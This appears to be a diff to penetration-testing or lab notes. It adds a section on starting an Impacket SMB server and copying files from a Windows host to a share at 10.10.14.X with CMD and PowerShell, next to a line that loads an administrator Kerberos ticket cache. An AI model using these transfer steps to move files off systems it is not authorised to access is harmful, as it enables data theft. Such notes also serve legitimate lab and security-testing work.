@@ -18,3 +18,24 @@ When you export this variable, Impacket tools (and standard Linux Kerberos utili
 ```
 export KRB5CCNAME=/path/to/your/administrator.ccache
 ```
+
+## Impacket SMB Server
+
+Start the server:
+
+```
+impacket-smbserver share /path/to/save/dir -smb2support
+```
+
+Copy files from a SMB client to the SMB server using Windows CMD:
+
+```
+copy C:\path\to\file.txt \\10.10.14.X\share\
+
+```
+
+Copy files from a SMB client to the SMB server using Windows PSH:
+
+```
+Copy-Item C:\path\to\file.txt \\10.10.14.X\share\
+```
